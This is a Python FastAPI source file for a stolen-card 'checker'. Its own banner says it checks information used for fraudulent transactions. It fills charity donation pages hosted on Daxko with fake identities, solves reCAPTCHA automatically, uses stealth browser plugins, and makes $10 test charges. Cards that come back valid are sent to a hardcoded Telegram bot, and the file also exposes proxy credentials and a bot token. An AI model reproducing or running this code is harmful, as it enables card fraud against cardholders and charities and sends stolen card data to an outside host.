from fastapi import FastAPI
from pydantic import BaseModel
import asyncio
import cloudscraper
from playwright.async_api import async_playwright, Error, Cookie, Response, Request, TimeoutError
import prettify
import random
from playwright_recaptcha import recaptchav2
import requests
# from rotatingproxy import rotate_masked
import undetected_chromedriver as uc
from playwright_stealth import stealth_async
from randomuser import RandomUser

app = FastAPI()


        
        
def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[ start:end ]
    except ValueError:
        return None
# uc.TARGET_VERSION = 11



   
def random_url():
    url = [
"https://operations.daxko.com/online/5110/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5065/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/3118/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5052/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5106/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2228/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2070/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5221/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5204/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2087/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/4078/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/4104/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5029/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2120/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5228/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/4072/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2218/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/3146/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/4073/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/8016/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2207/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5253/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2130/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5115/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5187/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2173/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2108/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2105/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/3017/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/4076/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/3148/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5298/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5245/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2174/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5155/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2044/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/8014/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5230/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2164/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2069/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2064/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2111/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5242/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/4000/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/4000/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2068/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2115/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2160/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5101/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2166/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5013/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5062/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5069/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/2062/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/4043/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/4043/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5044/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5097/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/3009/OnlineGiving/Donation.mvc",
"https://operations.daxko.com/online/5065/OnlineGiving/donation.mvc",
"https://ops1.operations.daxko.com/online/3122/OnlineGiving/Donation.mvc",
"https://ops1.operations.daxko.com/online/2124/OnlineGiving/Donation.mvc",
"https://ops1.operations.daxko.com/online/2131/OnlineGiving/Donation.mvc",
"https://ops1.operations.daxko.com/online/2233/OnlineGiving/Donation.mvc",
"https://ops1.operations.daxko.com/online/2189/OnlineGiving/Donation.mvc",
"https://ops1.operations.daxko.com/online/5073/OnlineGiving/Donation.mvc",
"https://ops1.operations.daxko.com/online/2122/OnlineGiving/Donation.mvc"
]
    return random.choice(url)


#  def start(self):
#      self.presetup()
#      tries = 0
#      while (tries <= 5):
#          self.delay()
#          try:
#              self.solve_captcha()
#          except Exception as e:
#              print(e)
#              self.main_frame.click("id=recaptcha-reload-button")
#          else:
#              s = self.recaptcha.locator("//span[@id='recaptcha-anchor']")
#              if s.get_attribute("aria-checked") != "false":
#                  self.page.click("id=recaptcha-demo-submit")
#                  self.delay()
#                  break
#          tries += 1
 
@app.get("/")
async def root():  
        return """
     CUSTOM GATEWAY CHECKER. by Dr. Ugs Security Production (Security Tester and IT consultant service.)

    this tool is used for checking information used for fr4ud transaction. i build this tool for security purposes only.

    Note:
        You can use this script at your own risks. i will not responsible of any the damage of this script in the future
        think wise !
        """


        
# class client_info(BaseModel):
#     card: str
#     desc: str
    
@app.post("/daxko1?card={card}")
async def daxko1_api(card):
    cc = card
                     
    ccdata = cc.split('|')
    ccn = ccdata[0]
    mm = ccdata[1]
    yy = ccdata[2]
    yy1 = yy[2:]
    cvv = ccdata[3]
    user = RandomUser({'nat': 'ca'})
    fullname = user.get_full_name()
    fname = user.get_first_name()
    lname = user.get_last_name()
    email = user.get_email()
    street = user.get_street()
    phone = user.get_phone()
    city = user.get_city()
    if ccn[:1] == "4":
        card_type = "visa"
    elif ccn[:1] == "5":
        card_type = "mastercard"
    elif ccn[:1] == "3":
        card_type = "amex"
    else:
        card_type = "discover"
    
    configs = {
        'CHROME_BUNDLE': "chromedriver",
        'HEADLESS': 'true'
        }
    
    headless = True if configs["HEADLESS"] == "true" else False    
    args = [
        '--deny-permission-prompts',
        '--no-default-browser-check',
        '--no-first-run',
        '--deny-permission-prompts',
        '--disable-popup-blocking',
        '--ignore-certificate-errors',
        '--no-service-autorun',
        '--password-store=basic',
        f'--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        '--window-size=640,480',
        '--disable-audio-output'
    ]       
    url = random_url()
    host = "rotating-residential.geonode.com:9010"
    user = "geonode_KpJmpEv7Bg"
    password = "490e6d9c-ccfe-4ee8-b282-2e56e796eac6"
    proxy = {"http": host, "https": host}
    proxies = {"server": host,
               "username": user,
               "password": password}
    scraper = cloudscraper.create_scraper()
    content =  scraper.get(url)
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=headless, args=args)
        # context = await browser.new_context()
        page = await browser.new_page()
        browser = await p.chromium.launch(headless=headless,  args=args)
#         context = browser.new_context()
        page = await browser.new_page()
        
        # async def set_proxy_for_request(route, request):
        #     page.on("request", lambda request: print(">>", request.method, request.url))
        #     urls = request.url
        #     req = request.post_data
        #     if 'payment_info_s' in req.json(): # assuming response is in JSON format
        #         payment_info = req.json()['payment_info_s']
        #         if 'credit_card' in payment_info:
        #             del payment_info['credit_card']['cvv']
        #             await  route.fulfill(url=request.url, body=request.body, headers=request.headers)
        #         print("success")
        #     else:
        #         await route.continue_()    
        #         print("good")    
       
        page.set_default_navigation_timeout(60000)
        await page.goto(f"data:text/html,{content.text}")
        await page.wait_for_timeout(10000)
        await page.goto(content.url)
        await page.wait_for_load_state(timeout=15000)
        await page.wait_for_timeout(10000)
#         page.proxy = rotate_masked()
        async with recaptchav2.AsyncSolver(page) as solver:
            await stealth_async(page)
            token = await solver.solve_recaptcha()
            print(token)  
        await page.get_by_role("button", name="Other").click()
        
        await page.get_by_role("button", name="$").locator("input[type=\"text\"]").fill("10")
        await page.get_by_role("heading", name="Your information").click()
        await page.get_by_label("Email Address").click()
        await page.get_by_label("Email Address").fill(email)
        await page.get_by_label("Email Address").press("Tab")
        await page.get_by_role("textbox", name="Name First Name").fill(fname)
        await page.get_by_role("textbox", name="Name First Name").press("Tab")
        await page.get_by_label("Last Name").fill(lname)
        await page.get_by_label("Last Name").press("Tab")
        await page.get_by_placeholder("205-555-5555").fill(phone)
        await page.get_by_placeholder("205-555-5555").press("Tab")
        await page.get_by_label("Zip Code").fill("90001")
        await page.get_by_label("Zip Code").press("Tab")
        await page.get_by_role("combobox", name="Payment Method *").select_option("credit_card")
        billing = await page.content()
        if "Billing Address" in billing:
            await page.get_by_label("Billing Address *").fill("d")
            await page.get_by_label("Billing Address *").click()
            await page.get_by_label("Billing Address *").fill(street)
            await page.get_by_label("Billing Zip *").click()
            await page.get_by_label("Billing Zip *").fill("90001")
            await page.get_by_label("Billing Zip *").press("Tab")
        await page.get_by_label("Name on Card *").click()
        await page.get_by_label("Name on Card *").fill(fullname)
        await page.locator("select[name=\"credit_card\\.card_type\"]").select_option(card_type)
        await page.locator("input[name=\"credit_card\\.card_number_formatted\"]").click()
        await page.locator("input[name=\"credit_card\\.card_number_formatted\"]").fill(ccn)
        await page.locator("input[name=\"credit_card\\.card_number_formatted\"]").press("Tab")
        await page.get_by_role("combobox", name="Expiration *").press("Tab")
        await page.locator("#expiration-month").select_option(value=mm)
        await page.locator("#expiration-year").select_option(value=yy)
        if "Security Code" in billing:
            await page.get_by_label("Security Code *").fill(cvv)
        await page.wait_for_load_state(timeout=20000)
        
        
        async with page.expect_response("**/make_payment") as respo:
            # page.proxy = None
            # await page.route(f"{url}/make_payment", set_proxy_for_request)
            await page.locator("#pay-button").click()
            res = await respo.value
            response = await res.body()
            print(response)
            # check_recaptcha_solved(page)
         
            
            
            
            
        # Bank_Message = find_between(str(response), 'name="Bank_Message" id="Bank_Message" value="', '"')
        # Bank_Resp_Code = find_between(str(response), 'name="Bank_Resp_Code" id="Bank_Resp_Code" value="', '"')
        # AVS = find_between(str(response), 'name="AVS" id="AVS" value="', '"')
        # _IP = find_between(str(response), 'name="Client_IP" id="Client_IP" value="', '"')
        # print(_IP)
        data = find_between(str(response), "{", "}")
        
        
        result =  str({data})
        result = result
        if 'CVV2/VAK Failure' in result or 'CVV2 Missmatch' in result or '"success":true' in result:
            requests.get(
                'https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text=' + cc)
        
            # respo = await get_response(navigate)
        await browser.close()
        await page.close()
        return result


